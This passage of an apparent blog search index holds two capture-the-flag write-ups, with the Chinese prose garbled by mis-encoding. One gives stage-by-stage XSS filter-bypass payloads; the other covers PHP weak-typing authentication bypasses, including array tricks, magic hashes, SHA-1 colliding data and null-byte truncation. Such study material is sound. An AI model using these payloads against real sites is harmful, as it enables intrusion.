9%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot; æ€»ç»“ç›®å‰ç¢°åˆ°çš„å…³äºmd5çš„é—®é¢˜åŸºæœ¬éƒ½åœ¨è¿™é‡Œäº†ï¼Œå¦‚æœæœ‰æ–°çš„å†è¿›è¡Œè®°å½•ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-MD5 -web","slug":"MD5-web","permalink":"http://example.com/tags/MD5-web/"}]},{"title":"xss challenges","slug":"xss-challenges","date":"2021-12-29T13:54:19.000Z","updated":"2021-12-30T07:38:29.348Z","comments":true,"path":"2021/12/29/xss-challenges/","link":"","permalink":"http://example.com/2021/12/29/xss-challenges/","excerpt":"å‰è¨€è€ƒè¯•å‘¨æ‘†çƒ‚ï¼Œè¢«å¤ä¹ å‹å¾—èº«å¿ƒä¿±ç–²ï¼Œåšä¼šé¶åœºé€é€æ°”ï¼Œå·©å›ºä¸‹xssã€‚è¿™ä¸ªé¶åœºçš„è¦æ±‚å°±æ˜¯æ³¨å…¥alert(document.domain)ã€‚","text":"å‰è¨€è€ƒè¯•å‘¨æ‘†çƒ‚ï¼Œè¢«å¤ä¹ å‹å¾—èº«å¿ƒä¿±ç–²ï¼Œåšä¼šé¶åœºé€é€æ°”ï¼Œå·©å›ºä¸‹xssã€‚è¿™ä¸ªé¶åœºçš„è¦æ±‚å°±æ˜¯æ³¨å…¥alert(document.domain)ã€‚ å†™åœ¨å‰é¢åœ°å€ï¼šxss challengeå¦‚æœé‡åˆ°éœ€è¦ä½¿ç”¨IEçš„æƒ…å†µä½†æ˜¯åˆæ²¡æœ‰å¯¹åº”ç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨æ§åˆ¶å°ä¸­ç›´æ¥æ‰§è¡Œalert(document.domain)è·³å…³ã€‚ stage 1Hintï¼švery simpleâ€¦ ç¡®å®ç®€å•ï¼Œæ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥å†™å…¥å°±å¯ä»¥äº†ï¼š 1&lt;script&gt;alert(document.domain)&lt;/script&gt; stage 2Hint: close the current tag and add SCRIPT tagâ€¦ å¦‚æœä¸çœ‹æç¤ºçš„è¯å»çœ‹æºç ä¹Ÿæ˜¯å¯ä»¥å‘ç°æ³¨å…¥æ—¶è¦è®°å¾—é—­åˆå¼•å·ä¸æ ‡ç­¾ï¼š 1&lt;input type=&quot;text&quot; name=&quot;p1&quot; size=&quot;50&quot; value=&quot;&quot;&gt; å› æ­¤æ„å»ºpayloadæ—¶è¦é¡ºä¾¿é—­åˆtagï¼š 1&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; stage 3Hint: The input in text box is properly escaped. æ–‡æœ¬æ¡†ä¸­çš„è¾“å…¥å·²ç»æ­£ç¡®è½¬ä¹‰ï¼Œè¿™å‘Šè¯‰æˆ‘ä»¬åˆ«æƒ³ä»æ–‡æœ¬æ¡†ä¸­è¿›è¡Œæ³¨å…¥ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°åé¢åˆå¤šäº†ä¸€ä¸ªé€‰æ‹©æ¡†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›è¡ŒæŠ“åŒ…å°†xssè¯­å¥å†™å…¥p2ä¸­ï¼š stage 4Hint: invisible input field éšè—çš„å†™å…¥ç‚¹ï¼Œæˆ‘ä»¬ç¿»ç¿»æºç ï¼Œå‘ç°å±…ç„¶è—äº†ä¸€ä¸ªéšè—çš„p3æ³¨å…¥ç‚¹ï¼Œæˆ–è€…ç›´æ¥æŠ“åŒ…ä¹Ÿå¯ä»¥çœ‹è§è¿™ä¸ªæ³¨å…¥ç‚¹ï¼Œç›´æ¥åœ¨p3å†™å…¥xsså°±è¡Œäº†ã€‚åŒæ ·è¦æ³¨æ„é—­åˆvalueï¼Œæ„å»ºxssï¼š 1p1=1&amp;p2=Japan&amp;p3=&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; stage 5Hint: length limited text box é™åˆ¶äº†textçš„é•¿åº¦ï¼Œè¿™ç§é¢˜æˆ‘ä»¬ä¹‹å‰ä¹Ÿæœ‰æ¥è§¦è¿‡ã€‚ç”±äºé™åˆ¶é•¿åº¦ä¸€èˆ¬å†™åœ¨äº†å‰ç«¯ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ›´æ”¹å‰ç«¯çš„JSç»•è¿‡ï¼š 1&lt;input type=&quot;text&quot; name=&quot;p1&quot; maxlength=&quot;100&quot; size=&quot;30&quot; value=&quot;&quot; &gt; ç„¶åå†™å…¥xsså°±è¡Œäº†ï¼š 1&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt; æˆ–è€…ç›´æ¥bpæŠ“åŒ…æäº¤ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ stage 6Hint: event handler attributes è¾“å…¥ç‚¹ä»æ˜¯valueï¼Œä½†æ˜¯å‘ç°&lt;&gt;è¢«htmlç‰¹æ®Šå­—ç¬¦æ›¿ä»£ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨è¿™é‡Œè€ƒè™‘æ·»åŠ äº‹ä»¶onclickï¼Œå½“æŒ‰é’®è¢«ç‚¹å‡»æ—¶è§¦å‘ï¼š 1&quot; onclick=&quot;alert(document.domain)&quot; stage 7Hint: nearly the sameâ€¦ but a bit more tricky. å°†ç¬¬äºŒå…³çš„payloadå†™å…¥å‘ç°æ•´æ®µpayloadéƒ½è¢«åŒ…è¿›äº†valueå½“ä¸­ï¼Œè¿™æ˜¯ç”±äºåŒå¼•å·è¢«è¿‡æ»¤äº†å¯¼è‡´é—­åˆä¸èƒ½æˆåŠŸã€‚ä¸è¿‡ä½¿ç”¨ä¸Šä¸€å…³çš„payloadè¿˜æ˜¯å¯è¡Œçš„: 1&quot; onclick=alert(document.domain)ï¼› å½“ç„¶ç”¨å…¶ä»–äº‹ä»¶æ ‡ç­¾ä¹Ÿæ˜¯å¯ä»¥çš„ï¼š 1&quot; onmouseover=alert(document.domain) //é¼ æ ‡æŒ‡é’ˆæŒ‡å‘æŒ‡å®šå†…å®¹æ—¶æ‰§è¡Œäº‹ä»¶ stage 8Hint: the â€˜javascriptâ€™ scheme. éšä¾¿è¾“å…¥ä¸€ä¸ªå€¼ï¼Œæäº¤åæŸ¥çœ‹æºç ï¼š å‘ç°è¿™ä¸ªå€¼è¢«åŒ…è£¹åœ¨äº†&lt;a&gt;ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨æ ‡ç­¾ä¸­æ·»åŠ ä¸€ä¸ªJavaScriptä¼ªé“¾æ¥å¹¶ç‚¹å‡»å³å¯ï¼š 1javascript:alert(document.domain) stage 9Hint: UTF-7 XSS è¿™å…³ç€å®æœ‰ç‚¹ç¦»è°±ï¼Œæç¤ºè¦æˆ‘ä»¬å°†payloadæ„é€ ä¸ºutf-7ç¼–ç åŒæ—¶è¿‡æ»¤äº†&lt;&gt;ï¼Œè€Œè¿™éœ€è¦ä½¿ç”¨IE7æµè§ˆå™¨ï¼Œä½†æ˜¯æˆ‘æ²¡æœ‰ï¼Œé‚£å°±ç›´æ¥æ”¾ä¸ªpayloadå§ï¼š 1p1=1%2bACI- Î¿nmÎ¿useÎ¿ver=%2bACI-alert(document.domain)%2bADsAIg- x=%2bACI-&amp;charset=UTF-7 stage 10Hint: s/domain//g; åŒæ ·å…ˆå†™å…¥æŸ¥çœ‹æºç ï¼Œå‘ç°domainè¢«è¿‡æ»¤äº†ï¼Œç›´æ¥åŒå†™ç»•è¿‡å³å¯ï¼š 1&quot;&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt; stage 11Hint: â€œs/script/xscript/ig;â€ and â€œs/on[a-z]+=/onxxx=/ig;â€ and â€œs/style=/stxxx=/ig;â€ æç¤ºæ„å‘³ç€scriptå’Œonclickéƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨æ ‡ç­¾åˆ¶ä½œè¶…é“¾æ¥ï¼Œå¹¶ä¸”ä½¿ç”¨åˆ¶è¡¨ç¬¦ï¼ˆå›è½¦ç¬¦ã€æ¢è¡Œç¬¦ç­‰ç­‰ä¸å¯è§å­—ç¬¦ï¼‰æ¥ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼š 1&quot;&gt;&lt;a href=&quot;javascr&amp;#09;ipt:alert(document.domain);&quot;&gt;gonext&lt;/a&gt; æˆ–è€…æŠŠsè¿›è¡Œhtmlå®ä½“åŒ–ï¼š 1&quot;&gt;&lt;a href=java&amp;#115;cript:alert(document.domain)&gt;gonext&lt;/a&gt; stage 12Hint: â€œs/[\\x00-\\x20&lt;&gt;&quot;&#39;]//g;â€ &lt;&gt;ã€åŒå¼•å·ã€ç©ºæ ¼éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œè¦åˆ©ç”¨IEæµè§ˆå™¨çš„ä¸€ä¸ªç‰¹æ€§ï¼ŒIEæµè§ˆå™¨ä¼šå°†ä¸¤ä¸ªåå¼•å·è¯†åˆ«ä¸ºåŒå¼•å·ï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºpayloadï¼š stage 13Hint: style attribute è¿™é‡Œè¦è¿ç”¨åˆ°cssçš„çŸ¥è¯†ä»¥åŠIE8ï¼Œå› æ­¤æ²¡æ³•ç›´æ¥æ¼”ç¤ºï¼Œå°±å¤§è‡´è®²ä¸‹åŸç†ã€‚ç”±äºåœ¨IEä¸‹èƒ½åœ¨CSSä¸­è¿è¡ŒJSä»£ç ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„å»ºCSSä»£ç å¹¶åœ¨å…¶ä¸­å†™å…¥jsä½¿IEæ‰§è¡Œxssã€‚è¿‡æ»¤äº†&lt;&gt;å’Œ&quot;ï¼Œpayloadå¦‚ä¸‹ï¼š 12xss:expression(alert(document.domain));background:url(javascript:alert(&#x27;xss&#x27;)); stage 14Hint: s/(url|script|eval|expression)/xxx/ig; åŒä¸Šä¸€å…³ï¼Œä½†æ˜¯è¿‡æ»¤äº†url``script``eval``expressionå››ä¸ªå…³é”®å­—ï¼Œè¿™é‡Œç›´æ¥ä½¿ç”¨æ³¨é‡Šç¬¦æ‰“æ–­å°±å¯ä»¥äº†ï¼š 12xss:expr\\0ession(alert(document.domain));xss:expr/**/ession(alert(document.domain)); stage 15Hint: document.write(); è¿™å…³ç›´æ¥è¿‡æ»¤äº†document.write()å’Œ\\ï¼Œè½¬ä¹‰äº†&lt;&gt;ã€&quot;ã€&amp;ï¼ŒåŒå†™åæ–œæ å¹¶ä¸”è¿›è¡Œç¼–ç å°±å¯ä»¥ç»•è¿‡äº†,16è¿›åˆ¶ã€8è¿›åˆ¶ã€unicodeç¼–ç ç­‰ç­‰éƒ½æ˜¯å¯ä»¥çš„ï¼Œæ„å»ºpayloadï¼š 123åå…­è¿›åˆ¶ï¼š \\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3eå…«è¿›åˆ¶ï¼š \\\\74cscript\\\\76ealert(document.domain);\\\\74/script\\\\76unicodeï¼š \\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e stage 16Hint: â€œdocument.write();â€ and â€œs/\\x/\\\\x/ig; æŠŠ\\\\xæ›¿æ¢æˆäº†\\\\\\\\xï¼Œå› æ­¤è¿™é‡Œä¸èƒ½ä½¿ç”¨åå…­è¿›åˆ¶ç¼–ç ï¼Œå› æ­¤ä½¿ç”¨ä¸Šä¸€å…³çš„å…«è¿›åˆ¶æˆ–è€…unicodeç¼–ç éƒ½æ˜¯å¯ä»¥çš„ï¼Œè¿™é‡Œæ¢ä¸€ç§å†™æ³•ï¼š 12Unicode: \\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003eå…«è¿›åˆ¶: \\\\74img src=x Î¿nerrÎ¿r=alert(document.domain)\\\\76 æ€»ç»“ç”±äºè¿™ä¸ªç¯å¢ƒå¤ªå¤è€äº†ï¼Œå› æ­¤æœ‰äº›åªèƒ½åœ¨IEä¸Šè·‘ï¼Œè€Œä¸”æœ‰äº›xsså·²ç»æœ‰ç‚¹è¿‡æ—¶äº†ï¼Œä¸è¿‡æœ‰äº›æ€è·¯è¿˜æ˜¯å€¼å¾—å­¦ä¹ çš„ï¼Œä¹‹åä¼šåšæ–°çš„xssé¢˜ç›®æ¥ç»§ç»­å·©å›ºã€‚ å…ˆæ€»ç»“å¼•å·è¢«è¿‡æ»¤çš„å‡ ç§æƒ…å†µï¼š æ·»åŠ å±æ€§ï¼ˆonmouseoveræˆ–onmouseoutäº‹ä»¶ç­‰ä»¥åŠexpressionï¼‰è§¦å‘å¼¹çª— &quot;ã€&lt;&gt;éƒ½è¢«è¿‡æ»¤æ—¶å¯ä»¥æ„é€ ç¼–ç  åˆ©ç”¨IEæµè§ˆå™¨åå¼•å·ç¿»è¯‘æˆåŒå¼•å·çš„ç‰¹æ€§","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -XSS","slug":"web-XSS","permalink":"http://example.com/tags/web-XSS/"}]},{"title":"phpå¼±ç±»å‹ç»•è¿‡æ€»ç»“","slug":"phpå¼±ç±»å‹ç»•è¿‡æ€»ç»“","date":"2021-12-18T12:59:01.000Z","updated":"2021-12-31T08:05:40.718Z","comments":true,"path":"2021/12/18/phpå¼±ç±»å‹ç»•è¿‡æ€»ç»“/","link":"","permalink":"http://example.com/2021/12/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/","excerpt":"å‰è¨€åˆ·é¢˜åˆ·åˆ°å¼±ç±»å‹ç»•è¿‡ï¼Œä¸€æ—¶å…´èµ·ï¼Œè§‰å¾—è¿™ä¸ªéƒ¨åˆ†ä¹Ÿæ˜¯ç›¸å½“æœ‰å¿…è¦åšæ€»ç»“çš„ï¼Œå°±å¼€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹ã€‚","text":"å‰è¨€åˆ·é¢˜åˆ·åˆ°å¼±ç±»å‹ç»•è¿‡ï¼Œä¸€æ—¶å…´èµ·ï¼Œè§‰å¾—è¿™ä¸ªéƒ¨åˆ†ä¹Ÿæ˜¯ç›¸å½“æœ‰å¿…è¦åšæ€»ç»“çš„ï¼Œå°±å¼€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹ã€‚ å…³äºå¼±ç±»å‹ç­‰æ¯”è¾ƒphpä¸­çš„ç­‰æ¯”è¾ƒè¿ç®—ç¬¦æœ‰ä¸¤ç§ï¼Œ==å’Œ===ã€‚ ==ï¼šå…ˆå°†å·¦å³ä¸¤è¾¹ç±»å‹è½¬åŒ–æˆä¸€è‡´ï¼Œå†è¿›è¡Œæ¯”è¾ƒå€¼æ˜¯å¦ä¸€è‡´ ===ï¼šå…ˆæ¯”è¾ƒå·¦å³ç±»å‹æ˜¯å¦ä¸€è‡´ï¼Œè‹¥ä¸€è‡´å†æ¯”è¾ƒå€¼æ˜¯å¦ä¸€è‡´ å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒå­—ç¬¦ä¸²ä¸æ•°å­—ç›¸ç­‰123456789$key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125; keyçš„å€¼è¦ä¸strè¿™ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ï¼Œä½†æ˜¯keyåªèƒ½æ˜¯æ•°å­—ï¼Œä¸è¿‡æ ¹æ®==çš„ç‰¹æ€§ï¼Œsträ¼šè¢«è½¬åŒ–ä¸ºæ•°å­—ï¼Œå› æ­¤æ„é€ payloadï¼š 1?key=123 æ•´æ•°æ¯”å¤§å°1234$temp = $_GET[&#x27;password&#x27;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336) &#123; echo $flag; passwordçš„å€¼æ¯”1336å¤§ï¼Œä½†æ˜¯passwordä¸èƒ½ä¸ºæ•°å­—ï¼ŒåŒæ ·çš„åŸç†ï¼Œç­‰å¼ä¸¤è¾¹æ¯”è¾ƒæ—¶==ä¼šæŠŠä¸¤è€…å˜ä¸ºç›¸åŒçš„ç±»å‹ï¼Œæ„å»ºpayloadï¼š 1?password=9999a urldecodeäºŒæ¬¡ç¼–ç 1234567891011&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;not allowed!&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;) &#123; echo &quot;Access granted!&quot;; echo &quot;flag&quot;;&#125;?&gt; ç”±äºæµè§ˆå™¨åœ¨è§£æURLæ—¶å·²ç»è¿›è¡Œè¿‡ä¸€æ¬¡URLè§£ç ï¼Œè€Œç¨‹åºåˆå†æ¬¡è¿›è¡Œè§£ç ï¼Œå› æ­¤äºŒæ¬¡ç¼–ç URLå°±å¯ä»¥äº†ï¼Œæ„å»ºpayloadï¼š 1?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 md5()/sha()çš„ç»•è¿‡123456789101112&lt;?phperror_reporting(0);$flag = &#x27;flag&#123;test&#125;&#x27;;if (isset($_GET[&#x27;username&#x27;]) and isset($_GET[&#x27;password&#x27;])) &#123; if ($_GET[&#x27;username&#x27;] == $_GET[&#x27;password&#x27;]) print &#x27;Your password can not be your username.&#x27;; else if (md5($_GET[&#x27;username&#x27;]) === md5($_GET[&#x27;password&#x27;])) die(&#x27;Flag: &#x27;.$flag); else print &#x27;Invalid password&#x27;;&#125;?&gt; å½“è¦è¾“å…¥ä¸¤ä¸ªå€¼ï¼Œè¿™ä¸¤ä¸ªå€¼ä¸èƒ½ä¸€è‡´ä½†æ˜¯å…¶md5/shaç¼–ç åçš„å€¼è¦ç›¸ç­‰ï¼Œè¿™é‡Œæœ‰ä¸¤ç§è§£é¢˜æ–¹æ³•ï¼š æ•°ç»„æ³•md5()/sha()è¿™ç±»å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„æ˜¯æ•°ç»„,md5()è¿”å›NULLï¼ŒåŠ å¯†åå¾—åˆ°çš„ä¹Ÿæ˜¯NULLï¼Œæ»¡è¶³ä¸¤ä¸ªmd5å€¼ç›¸ç­‰ï¼›sha()è¿”å›falseï¼Œä½¿æ¡ä»¶æˆç«‹ï¼Œæ„å»ºpayloadï¼š 1?username[]=1&amp;password[]=2 pdfæ³•è¿™ä¸ªæ–¹æ³•ä¹‹å‰æåˆ°è¿‡ï¼Œå½“æ•°ç»„è¢«è¿‡æ»¤æˆ–è€…md5/shaå€¼ä¸èƒ½ä¸ºç©ºæ—¶ï¼Œå°±è¦ç”¨åˆ°googleæ”¾å‡ºä¸¤ä¸ªsha1å€¼ç›¸åŒè€Œä¸ä¸€æ ·(sha256çš„å€¼ä¸é€š)çš„pdfæ–‡ä»¶ã€‚åŸç†å¯ä»¥å‚è€ƒè¿™ç¯‡åšå®¢ï¼šå…³äºSHA1ç¢°æ’â€”â€”æ¯”è¾ƒä¸¤ä¸ªbinaryçš„ä¸åŒä¹‹å¤„ï¼Œæ„å»ºpayloadï¼š 1?username=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;password=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1 strcmpæ¯”è¾ƒå­—ç¬¦ä¸²123456789&lt;?php$flag = &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#x27;a&#x27;])) &#123; if (strcmp($_GET[&#x27;a&#x27;], $flag) == 0) die(&#x27;Flag: &#x27;.$flag); else print &#x27;No&#x27;;&#125;?&gt; è¿™é‡Œç”¨strcmp()å¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²è¿›è¡Œäº†æ¯”è¾ƒï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚ strcmp(string1,string2)ï¼Œè¯¥å‡½æ•°è¿”å›ï¼š 0 - å¦‚æœä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ &lt;0 - å¦‚æœ string1 å°äº string2 0 - å¦‚æœ string1 å¤§äº string2 å¯¹äºä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œstrcmpå‡½æ•°ä¼šæŠ¥é”™ï¼Œå°†è¿”å›0ã€‚æ‰€ä»¥ï¼Œstrcmp()åœ¨æ¯”è¾ƒå­—ç¬¦ä¸²å’Œæ•°ç»„çš„æ—¶å€™ç›´æ¥è¿”å›0ï¼Œè¿™æ ·é€šè¿‡æŠŠç›®æ ‡å˜é‡è®¾ç½®æˆæ•°ç»„å°±å¯ä»¥ç»•è¿‡è¯¥å‡½æ•°çš„é™åˆ¶ï¼Œæ„å»ºpayloadï¼š 1?a[]=1 è¿‡æ»¤æ•°å­—è¿›è¡Œæ¯”è¾ƒ12345678910111213141516171819202122&lt;?phperror_reporting(0);function noother_says_correct($temp) &#123; $flag = &#x27;flag&#123;test&#125;&#x27;; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); $number = &#x27;3735929054&#x27;; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) &#123; // Disallow all the digits! $digit = ord($temp &#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; // Aha, digit not allowed! return &quot;flase&quot;; &#125; &#125; if($number == $temp) return $flag;&#125;$temp = $_GET[&#x27;password&#x27;];echo noother_says_correct($temp);?&gt; ord()ï¼šè¿”å›å­—ç¬¦çš„asciiç å€¼ã€‚ è¿™é‡Œè¿‡æ»¤äº†1-9çš„æ•°å­—ï¼Œåˆè¦æ±‚ä¼ å…¥passwordçš„å€¼ä¸º3735929054ï¼Œè¿™é‡Œéœ€è¦å°†å€¼åŒ–æˆåå…­è¿›åˆ¶å†ä¼ å…¥ï¼Œæ„å»ºpayloadï¼š 1?password=0xdeadc0de extractå˜é‡è¦†ç›–123456789101112&lt;?php$flag=&#x27;xxx&#x27;;extract($_GET);if(isset($shiyan)) &#123; $content=trim(file_get_contents($flag)); if($shiyan==$content) &#123; echo&#x27;flag&#123;xxx&#125;&#x27;; &#125; else &#123; echo&#x27;Oh.no&#x27;; &#125;&#125;?&gt; extract():å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨trim(string[,charlist]):ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ï¼Œè‹¥çœç•¥åé¢ä¸€ä¸ªå‚æ•°ï¼Œåˆ™å»é™¤\\0ã€\\tã€\\nã€\\x0Bã€\\rå’Œç©ºæ ¼ã€‚ è¿ç”¨extract()å°†GETæ–¹å¼è·å¾—çš„å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ï¼Œç„¶ååˆ¤æ–­$ flagå’Œ$shiyanä¸¤ä¸ªå˜é‡çš„å†…å®¹æ˜¯å¦ç›¸ç­‰ã€‚é‚£ä¹ˆæˆ‘ä»¬å°†$flagå’Œ$shiyanè¿™ä¸¤ä¸ªå˜é‡çš„å†…å®¹éƒ½ä¼šè¢«è®¾ç½®æˆç©ºå­—ç¬¦ä¸²ã€‚æ„å»ºpayloadï¼š 1Payload:?flag=&amp;shiyan= é™åˆ¶ä¼ å…¥çš„åŒ¹é…1234567891011&lt;?php$flag = &quot;flag&quot;;if (isset ($_GET[&#x27;password&#x27;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) echo &#x27;You password must be alphanumeric&#x27;; else if (strpos ($_GET[&#x27;password&#x27;], &#x27;--&#x27;) !== FALSE) die(&#x27;Flag: &#x27; . $flag); else echo &#x27;Invalid password&#x27;;&#125;?&gt; ereg()ï¼šé™åˆ¶ä¼ å…¥å†…å®¹ï¼Œä¾‹å¦‚ä¸Šé¢å°±æ˜¯é™åˆ¶äº†åªèƒ½ä¼ å…¥æ•°å­—ä»¥åŠå¤§å°å†™å­—æ¯ã€‚strpos()ï¼šæŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚ å¯¹ä¼ å…¥è¿›è¡Œé™åˆ¶ï¼Œä½†æ˜¯åˆè¦æ±‚å¯†ç ä¸­å«æœ‰â€“ï¼Œå› æ­¤æˆ‘ä»¬è¿™é‡Œæœ‰ä¸¤ç§ç»•è¿‡æ–¹æ³•ï¼š æ•°ç»„æ³•åŒæ ·strpos()å¦‚æœä¼ å…¥æ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œä»è€Œç»•è¿‡å¯¹--çš„æ£€æµ‹ï¼Œæ„å»ºpayloadï¼š 1?password[]=1 æˆªæ–­æ³•åœ¨%00åçš„å‡½æ•°æ— æ³•è¯†åˆ«ï¼Œå› æ­¤æ„å»ºpayloadï¼š 1?password=1%00-- JSON123456789101112131415&lt;?phpif (isset($_POST[&#x27;message&#x27;])) &#123; $message = json_decode($_POST[&#x27;message&#x27;]); $key =&quot;*********&quot;; if ($message-&gt;key == $key) &#123; echo &quot;flag&quot;; &#125; else &#123; echo &quot;fail&quot;; &#125;&#125;else&#123; echo &quot;~~~~&quot;;&#125;?&gt; è¾“å…¥ä¸€ä¸ªæ•°ç»„è¿›è¡Œjsonè§£ç ï¼Œè§£ç åçš„messageä¸keyå€¼ç›¸åŒæ‰ä¼šå¾—åˆ°flagï¼Œä½¿ç”¨å¼±ç±»å‹è¿›è¡Œç»•è¿‡ï¼Œkeyè‚¯å®šæ˜¯å­—ç¬¦ä¸²ï¼Œä¸¤ä¸ªç­‰å·æ—¶ä¼šè½¬åŒ–æˆåŒä¸€ç±»å‹å†è¿›è¡Œæ¯”è¾ƒï¼Œç›´æ¥æ„é€ ä¸€ä¸ª0å°±å¯ä»¥ç›¸ç­‰äº†ï¼Œé€šè¿‡0==â€adminâ€è¿™ç§å½¢å¼ç»•è¿‡ï¼Œæ„å»ºpayloadï¼š 1?message=&#123;&quot;key&quot;:0&#125; ç§‘å­¦è®¡æ•°æ³•ç¼–ç åŠ å¯†ç›¸ç­‰1234if ($_GET[&quot;a&quot;] != hash(&quot;md4&quot;, $_GET[&quot;a&quot;])) &#123; echo &quot;&lt;br&gt;&quot;; die(&#x27;Theshy is locked&#x27;);&#125; ä½¿ä¼ å…¥çš„å‚æ•°aä¸ç»è¿‡md4ç¼–ç åçš„å€¼ç›¸åŒï¼Œè¿™é‡Œæˆ‘ä»¬æ‰¾ä»¥0eå¼€å¤´ï¼Œä»¥åŠç»è¿‡md4ç¼–ç åä»ç„¶ä»¥0eå¼€å¤´çš„aå€¼ï¼Œæ„å»ºpayloadï¼š 1?a=0e251288019 å¦‚æœæ˜¯md5çš„è¯æ„å»ºpayloadï¼š 1?a=0e215962017 é•¿åº¦é™åˆ¶ç»•è¿‡12345678910111213141516&lt;?php$flag = &quot;xxx&quot;;if (isset ($_GET[&#x27;password&#x27;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#x27;password&#x27;]) === FALSE) &#123; echo &#x27;You password must be alphanumeric&#x27;; &#125; else if 